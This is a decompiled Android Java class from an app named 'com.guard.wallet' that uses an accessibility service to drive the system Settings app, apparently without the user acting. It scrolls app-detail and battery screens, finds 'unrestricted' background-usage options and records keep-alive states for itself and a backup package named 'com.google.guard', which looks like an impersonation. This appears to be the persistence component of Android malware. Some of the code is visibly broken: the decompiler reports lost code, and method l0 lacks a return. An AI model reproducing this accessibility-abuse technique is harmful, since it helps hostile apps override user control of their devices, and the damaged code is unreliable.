package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;
import p014r.EnumC0892e;

/* renamed from: o.g */
/* loaded from: classes.dex */
public final class C0418g extends AbstractC0414c {

    /* renamed from: v */
    public static final /* synthetic */ int f887v = 0;

    /* renamed from: r */
    public final AtomicReference f888r;

    /* renamed from: s */
    public final AtomicBoolean f889s;

    /* renamed from: t */
    public final AtomicBoolean f890t;

    /* renamed from: u */
    public final AtomicBoolean f891u;

    public C0418g() {
        super(k0(), "com.android.settings");
        this.f888r = new AtomicReference(EnumC0892e.KEEP_ALIVE_UNKNOWN);
        this.f889s = new AtomicBoolean(false);
        this.f890t = new AtomicBoolean(false);
        this.f891u = new AtomicBoolean(false);
        try {
            this.f852p.schedule(new RunnableC0417f(this, 2), 30L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.g", e2);
        }
    }

    public static CombineFilter b0() {
        String m627b = AbstractC0250f.m627b("COMMON_ALLOW_BACKGROUND_USAGE_TEXT");
        if (AbstractC0026q.m151B(m627b)) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m6b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY, m627b));
        return combineFilter;
    }

    public static CombineFilter c0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_BATTERY_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("COMMON_SETTINGS_BATTERY_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static ListenWindow d0() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow e0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.applications.InstalledAppDetailsTop");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static CombineFilter f0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_POWER_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("COMMON_SETTINGS_POWER_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static CombineFilter g0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_USE_POWER_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("COMMON_SETTINGS_USE_POWER_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static ListenWindow j0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static LinkedList k0() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(AbstractC0414c.m1035J());
        linkedList.add(e0(AbstractC0251g.x0()));
        linkedList.add(e0(AbstractC0251g.m658e()));
        linkedList.add(m0(AbstractC0251g.x0()));
        linkedList.add(m0(AbstractC0251g.m658e()));
        linkedList.add(j0(AbstractC0251g.x0()));
        linkedList.add(j0(AbstractC0251g.m658e()));
        linkedList.add(d0());
        return linkedList;
    }

    public static ListenWindow m0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.spa.SpaActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static CombineFiltersWithOr o0() {
        CombineFilter combineFilter;
        CombineFilter combineFilter2;
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        CombineFilter combineFilter3 = null;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_UNRESTRICTED_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("COMMON_SETTINGS_UNRESTRICTED_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter != null) {
            combineFiltersWithOr.getFilters().add(combineFilter);
        }
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_NO_RESTRICTED_TEXT"))) {
            combineFilter2 = null;
        } else {
            combineFilter2 = new CombineFilter();
            StringCondition m1008b2 = AbstractC0413b.m1008b(combineFilter2, AbstractC0000a.m7c(combineFilter2, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("COMMON_SETTINGS_NO_RESTRICTED_TEXT", m1008b2, combineFilter2, m1008b2);
        }
        if (combineFilter2 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter2);
        }
        if (!AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"))) {
            combineFilter3 = new CombineFilter();
            StringCondition m1008b3 = AbstractC0413b.m1008b(combineFilter3, AbstractC0000a.m7c(combineFilter3, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT", m1008b3, combineFilter3, m1008b3);
        }
        if (combineFilter3 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter3);
        }
        return combineFiltersWithOr;
    }

    @Override // p012o.AbstractC0414c
    /* renamed from: Z */
    public final void mo1051Z() {
        ReentrantLock reentrantLock = this.f851o;
        if (reentrantLock.tryLock()) {
            try {
                if (!m1049T()) {
                    Log.d("o.g", "准备结束本地保活自动化引擎");
                    m1050X();
                    AbstractC0184g.m354h(100);
                    if (MyAccessibilityService.m554P() != null) {
                        MyAccessibilityService.m554P().m543x();
                    }
                    AtomicReference atomicReference = this.f888r;
                    if (Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP)) {
                        n0(MainApplication.getAppContext().getPackageName());
                    }
                    if (Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_BACKUP_APP)) {
                        n0("com.google.guard");
                    }
                    this.f852p.shutdownNow();
                    AbstractC0243l.m591a(this.f864c);
                    this.f850n.clear();
                    if (AbstractC0026q.m162M()) {
                        AbstractC0251g.T0(5);
                    }
                    AbstractC0184g.m349c();
                    Log.d("o.g", "已结束本地保活自动化引擎");
                    AbstractC0414c.m1044W();
                    mo1001d();
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("o.g", e2);
            }
            reentrantLock.unlock();
        }
    }

    public final boolean h0() {
        try {
            if (!m1078q(Collections.singletonList(d0()))) {
                return false;
            }
            Log.d("o.g", "已进入App耗电管理窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.g", e2);
            return false;
        }
    }

    public final boolean i0() {
        try {
            String x02 = Objects.equals(this.f888r.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP) ? AbstractC0251g.x0() : AbstractC0251g.m658e();
            LinkedList linkedList = new LinkedList();
            linkedList.add(e0(x02));
            linkedList.add(m0(x02));
            linkedList.add(j0(x02));
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.g", "已进入App详情窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.g", e2);
            return false;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:16:0x002a, code lost:
    
        r7 = r12.findOneByCombine(r2);
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final UiObject l0(UiObject uiObject) {
        UiObject uiObject2;
        UiObject uiObject3;
        CombineFilter c02;
        CombineFilter f02;
        CombineFilter g02;
        AtomicInteger atomicInteger;
        UiObject uiObject4 = null;
        try {
            uiObject.refresh();
            Log.d("o.g", "开始滚动电池电量管理栏目");
            c02 = c0();
            f02 = f0();
            g02 = g0();
            atomicInteger = new AtomicInteger(0);
        } catch (Exception e2) {
            e = e2;
            uiObject2 = null;
            uiObject3 = null;
        }
        if (c02 == null && f02 == null && g02 == null) {
            uiObject2 = null;
            uiObject3 = null;
            return uiObject4 != null ? uiObject4 : uiObject3 != null ? uiObject3 : uiObject2;
        }
        UiObject uiObject5 = null;
        if (f02 != null) {
            try {
                uiObject3 = uiObject.findOneByCombine(f02);
            } catch (Exception e3) {
                e = e3;
                uiObject2 = null;
                uiObject3 = null;
                uiObject4 = uiObject5;
                AbstractC0026q.m186s("o.g", e);
            }
        } else {
            uiObject3 = null;
        }
        if (g02 != null) {
            try {
                uiObject4 = uiObject.findOneByCombine(g02);
            } catch (Exception e4) {
                e = e4;
                uiObject2 = uiObject4;
                uiObject4 = uiObject5;
                AbstractC0026q.m186s("o.g", e);
            }
        }
        while (uiObject.canScrollForward() && atomicInteger.incrementAndGet() < 10) {
            Log.d("o.g", "滚动视图可以向下滚动");
            if ((uiObject5 != null && uiObject5.visibleToUser()) || ((uiObject3 != null && uiObject3.visibleToUser()) || (uiObject4 != null && uiObject4.visibleToUser()))) {
                break;
            }
            if (uiObject.scrollForwardByGesture()) {
                Log.d("o.g", "向下滚动查找电池电量管理栏目");
                AbstractC0251g.T0(10);
                uiObject.refresh();
                if (c02 != null) {
                    uiObject5 = uiObject.findOneByCombine(c02);
                }
                if (f02 != null) {
                    uiObject3 = uiObject.findOneByCombine(f02);
                }
                if (g02 != null) {
                    uiObject4 = uiObject.findOneByCombine(g02);
                }
            }
        }
        atomicInteger.set(0);
        uiObject2 = uiObject4;
        uiObject4 = uiObject5;
        while (uiObject.canScrollBackward() && atomicInteger.incrementAndGet() < 10) {
            try {
                Log.d("o.g", "滚动视图可以向上滚动");
                if ((uiObject4 != null && uiObject4.visibleToUser()) || ((uiObject3 != null && uiObject3.visibleToUser()) || (uiObject2 != null && uiObject2.visibleToUser()))) {
                    break;
                }
                if (uiObject.scrollBackwardByGesture()) {
                    Log.d("o.g", "向上滚动查找电池电量管理栏目");
                    AbstractC0251g.T0(10);
                    uiObject.refresh();
                    if (c02 != null) {
                        uiObject4 = uiObject.findOneByCombine(c02);
                    }
                    if (f02 != null) {
                        uiObject3 = uiObject.findOneByCombine(f02);
                    }
                    if (g02 != null) {
                        uiObject2 = uiObject.findOneByCombine(g02);
                    }
                }
            } catch (Exception e5) {
                e = e5;
                AbstractC0026q.m186s("o.g", e);
            }
        }
    }

    public final void n0(String str) {
        try {
            PowerControlStateVO m707k = AbstractC0252h.m707k(str);
            m707k.setPackageName(str);
            AtomicBoolean atomicBoolean = this.f889s;
            if (atomicBoolean.get()) {
                m707k.setAllowAllFullBackground(Boolean.valueOf(atomicBoolean.get()));
            }
            AtomicBoolean atomicBoolean2 = this.f890t;
            if (atomicBoolean2.get()) {
                m707k.setAllowAutoStart(Boolean.valueOf(atomicBoolean2.get()));
            }
            AtomicBoolean atomicBoolean3 = this.f891u;
            if (atomicBoolean3.get()) {
                m707k.setAllowRelateStart(Boolean.valueOf(atomicBoolean3.get()));
            }
            m707k.setRetryCount(m707k.getRetryCount() + 1);
            AbstractC0252h.m691L(m707k);
            Log.d("o.g", "已保存本地保活策略".concat("|").concat(str));
            "已保存本地保活策略".concat("|").concat(str);
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.g", e2);
        }
    }

    @Override // p012o.AbstractC0414c, p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        try {
            if (m1049T()) {
                return;
            }
            if (accessibilityEvent != null) {
                super.mo1002u(accessibilityEvent, str, str2);
            }
            boolean i02 = i0();
            String str3 = this.f864c;
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f850n;
            if (i02) {
                concurrentLinkedQueue.remove("keepAliveInAppBattery");
                if (!concurrentLinkedQueue.contains("keepAliveInAppDetail")) {
                    concurrentLinkedQueue.add("keepAliveInAppDetail");
                    AbstractC0243l.m593c(new RunnableC0417f(this, 0), str3);
                }
            }
            if (h0()) {
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                if (concurrentLinkedQueue.contains("keepAliveInAppBattery")) {
                    return;
                }
                concurrentLinkedQueue.add("keepAliveInAppBattery");
                AbstractC0243l.m593c(new RunnableC0417f(this, 1), str3);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.g", e2);
        }
    }
}
